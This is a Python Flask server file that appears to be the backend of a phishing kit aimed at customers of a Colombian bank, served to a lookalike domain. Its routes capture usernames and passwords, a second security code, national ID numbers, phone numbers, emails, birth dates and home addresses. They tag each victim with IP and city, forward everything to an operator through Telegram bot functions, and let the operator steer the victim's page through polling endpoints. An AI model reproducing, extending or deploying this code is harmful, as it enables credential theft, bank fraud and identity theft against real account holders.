
from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import threading
import datetime
import urllib.request as urlreq
from bot import enviar_solicitud_admin, enviar_clave_admin, enviar_registro_admin, enviar_complementario_admin, procesar_update
from state import pending_action

app = Flask(__name__)
CORS(app, origins=["https://prycambavarbccolombia.com"])

ARCHIVO      = "solicitudes.json"
ARCHIVO_VAL  = "validaciones.json"
ARCHIVO_REG  = "registros.json"
ARCHIVO_COMP = "complementarios.json"
CONTADOR     = "contador.json"

# ── IDs numericos ─────────────────────────────────────────────
def siguiente_id(tipo):
    try:
        with open(CONTADOR, "r") as f:
            c = json.load(f)
    except:
        c = {}
    c[tipo] = c.get(tipo, 0) + 1
    with open(CONTADOR, "w") as f:
        json.dump(c, f)
    return c[tipo]

# ── Helpers ───────────────────────────────────────────────────
def leer(archivo):
    try:
        with open(archivo, "r") as f:
            return json.load(f)
    except:
        return []

def guardar(archivo, data):
    with open(archivo, "w") as f:
        json.dump(data, f, indent=2)

def obtener_ciudad(ip):
    if not ip or ip in ("127.0.0.1", "::1", "Desconocida"):
        return "Local"
    try:
        url = f"http://ip-api.com/json/{ip}?fields=city,country"
        with urlreq.urlopen(url, timeout=3) as r:
            data = json.loads(r.read())
            return f"{data.get('city','?')}, {data.get('country','?')}"
    except:
        return "Desconocida"

# ── Webhook de Telegram ───────────────────────────────────────
@app.route("/webhook", methods=["POST"])
def webhook():
    procesar_update(request.json)
    return "ok", 200

# ── Rutas ─────────────────────────────────────────────────────
@app.route("/login", methods=["POST"])
def login():
    datos = request.json
    ip    = datos.get("ip", request.remote_addr)
    ahora = datetime.datetime.now()
    nid   = siguiente_id("solicitudes")

    solicitud = {
        "id":      nid,
        "usuario": datos.get("usuario"),
        "clave":  datos.get("clave", ""),
        "estado":  "pendiente",
        "ip":      ip,
        "ciudad":  obtener_ciudad(ip),
        "hora":    ahora.strftime("%H:%M:%S"),
        "fecha":   ahora.strftime("%d/%m/%Y"),
    }
    lista = leer(ARCHIVO)
    lista.append(solicitud)
    guardar(ARCHIVO, lista)

    threading.Thread(target=enviar_solicitud_admin, args=(solicitud,)).start()
    return jsonify({"id": nid, "estado": "pendiente"})

@app.route("/estado/<int:id>", methods=["GET"])
def estado(id):
    for s in leer(ARCHIVO):
        if s["id"] == id:
            return jsonify({"estado": s["estado"]})
    return jsonify({"estado": "no_encontrado"}), 404

@app.route("/validar-clave", methods=["POST"])
def validar_clave():
    datos  = request.json
    ahora  = datetime.datetime.now()
    nid    = siguiente_id("validaciones")

    validacion = {
        "id":           nid,
        "clave":        datos.get("clave", ""),
        "solicitud_id": datos.get("solicitud_id"),
        "estado":       "pendiente",
        "hora":         ahora.strftime("%H:%M:%S"),
    }
    lista = leer(ARCHIVO_VAL)
    lista.append(validacion)
    guardar(ARCHIVO_VAL, lista)

    threading.Thread(target=enviar_clave_admin, args=(validacion,)).start()
    return jsonify({"id": nid})

@app.route("/validacion/<int:id>", methods=["GET"])
def validacion(id):
    for v in leer(ARCHIVO_VAL):
        if v["id"] == id:
            return jsonify({"estado": v["estado"]})
    return jsonify({"estado": "no_encontrado"}), 404

@app.route("/registro", methods=["POST"])
def registro():
    datos = request.json
    ahora = datetime.datetime.now()
    nid   = siguiente_id("registros")

    reg = {
        "id":           nid,
        "nombre":       datos.get("nombre", ""),
        "apellido":     datos.get("apellido", ""),
        "cedula":       datos.get("cedula", ""),
        "telefono":     datos.get("telefono", ""),
        "correo":       datos.get("correo", ""),
        "solicitud_id": datos.get("solicitud_id"),
        "estado":       "pendiente",
        "hora":         ahora.strftime("%H:%M:%S"),
        "fecha":        ahora.strftime("%d/%m/%Y"),
    }
    lista = leer(ARCHIVO_REG)
    lista.append(reg)
    guardar(ARCHIVO_REG, lista)

    threading.Thread(target=enviar_registro_admin, args=(reg,)).start()
    return jsonify({"id": nid})

@app.route("/registro/<int:id>", methods=["GET"])
def estado_registro(id):
    for r in leer(ARCHIVO_REG):
        if r["id"] == id:
            return jsonify({"estado": r["estado"]})
    return jsonify({"estado": "no_encontrado"}), 404

@app.route("/complementario", methods=["POST"])
def complementario():
    datos = request.json
    ahora = datetime.datetime.now()
    nid   = siguiente_id("complementarios")

    comp = {
        "id":           nid,
        "tipo_doc":     datos.get("tipo_doc", ""),
        "nacimiento":   datos.get("nacimiento", ""),
        "departamento": datos.get("departamento", ""),
        "municipio":    datos.get("municipio", ""),
        "barrio":       datos.get("barrio", ""),
        "direccion":    datos.get("direccion", ""),
        "solicitud_id": datos.get("solicitud_id"),
        "estado":       "pendiente",
        "hora":         ahora.strftime("%H:%M:%S"),
        "fecha":        ahora.strftime("%d/%m/%Y"),
    }
    lista = leer(ARCHIVO_COMP)
    lista.append(comp)
    guardar(ARCHIVO_COMP, lista)

    threading.Thread(target=enviar_complementario_admin, args=(comp,)).start()
    return jsonify({"id": nid})

@app.route("/complementario/<int:id>", methods=["GET"])
def estado_complementario(id):
    for c in leer(ARCHIVO_COMP):
        if c["id"] == id:
            return jsonify({"estado": c["estado"]})
    return jsonify({"estado": "no_encontrado"}), 404

@app.route("/accion", methods=["GET"])
def get_accion():
    accion = pending_action["accion"]
    pending_action["accion"] = None
    return jsonify({"accion": accion})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
